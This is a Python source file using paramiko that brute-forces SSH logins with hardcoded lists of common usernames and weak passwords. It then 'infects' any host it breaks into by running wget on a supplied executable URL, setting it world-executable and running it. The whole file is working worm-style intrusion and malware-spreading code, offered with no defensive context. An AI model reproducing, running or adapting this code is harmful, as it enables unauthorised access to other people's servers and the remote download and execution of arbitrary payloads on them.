import paramiko, sys, os, socket

usernames = ['ubuntu', 'a', 'aaron', 'accounts', 'adam', 'adm', 'admin', 'alan', 'alex', 'amanda', 'amavisd', 'amy', 'angel', 'anita', 'anna', 'apache', 'avahi', 'backup', 'backuppc', 'brett', 'clamav', 'controller', 'daemon', 'danny', 'dark', 'data', 'david', 'eddy', 'edu', 'einstein', 'emily', 'frank', 'ftp', 'games', 'george', 'ghost', 'gibson', 'guest', 'http', 'httpd', 'hunter', 'ident', 'info', 'internet', 'java', 'john', 'judy', 'jun', 'kon', 'library', 'linux', 'magnos', 'mail', 'master', 'michael', 'mike', 'ming', 'monitor', 'mysql', 'netdump', 'news', 'nobody', 'operator', 'oracle', 'paul', 'pgsql', 'post', 'postgres', 'qtss', 'rebecca', 'richard', 'root', 'sales', 'sam', 'sandra', 'sara', 'security', 'sharon', 'shop', 'stephen', 'student', 'tanya', 'test', 'tiffany', 'token', 'tracy', 'user', 'username', 'web', 'webadmin', 'webmaster', 'webs', 'www', 'www-data', 'wwwrun']
passwords = ['1','root', '!@', 'wubao', 'password', '123456', 'admin', '12345', '1234', 'p@ssw0rd', '123', '1', 'jiamima', 'test', 'root123', '!', '!q@w', '!qaz@wsx', 'idc!@', 'admin!@', '', 'alpine', 'qwerty', '12345678', '111111', '123456789', '1q2w3e4r', '123123', 'default', '1234567', 'qwe123', '1qaz2wsx', '1234567890', 'abcd1234', '000000', 'user', 'toor', 'qwer1234', '1q2w3e', 'asdf1234', 'redhat', '1234qwer', 'cisco', '12qwaszx', 'test123', '1q2w3e4r5t', 'admin123', 'changeme', '1qazxsw2', '123qweasd', 'q1w2e3r4', 'letmein', 'server', 'root1234', 'master', 'abc123', 'rootroot', 'a', 'system', 'pass', '1qaz2wsx3edc', 'p@$$w0rd', '112233', 'welcome', '!QAZ2wsx', 'linux', '123321', 'manager', '1qazXSW@', 'q1w2e3r4t5', 'oracle', 'asd123', 'admin123456', 'ubnt', '123qwe', 'qazwsxedc', 'administrator', 'superuser', 'zaq12wsx', '121212', '654321', 'ubuntu', '0000', 'zxcvbnm', 'root@123', '1111', 'vmware', 'q1w2e3', 'qwerty123', 'cisco123', '11111111', 'pa55w0rd', 'asdfgh', '11111', '123abc', 'asdf', 'centos', '888888', '54321', 'password123']

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

global status
status = False

def infect(ip, username, password,executable):
    global ssh
    ssh.connect(ip, port=22, username=username, password=password)
    try:
        ssh.exec_command('wget %s '%executable)
        ssh.exec_command("chmod 777 %s" % executable)
        ssh.exec_command("./%s" % executable)
        return True
    except:
        return False


def ssh_connect(host, username, password, code=0):
    global ssh
    try:
        ssh.connect(host, port=22, username=username, password=password)
    except paramiko.AuthenticationException:
        code = 1
    except socket.error as e:
        code = 2

    ssh.close()
    return code


def brute_force(ip,executable):
    global status
    status = True
    infected = False
    for password in passwords:
        for username in usernames:
            try:
                if status:
                    response = ssh_connect(ip, username, password)
                    if response == 0:
                        found_flag = True
                        infected = infect(ip, username,password,executable)
                        return infected
                    elif response == 1:
                        pass
                    elif response == 3:
                        pass
                else:
                    return infected
            except Exception as e:
                print(e)
                pass
    return infected


def stop():
    global status
    status = False
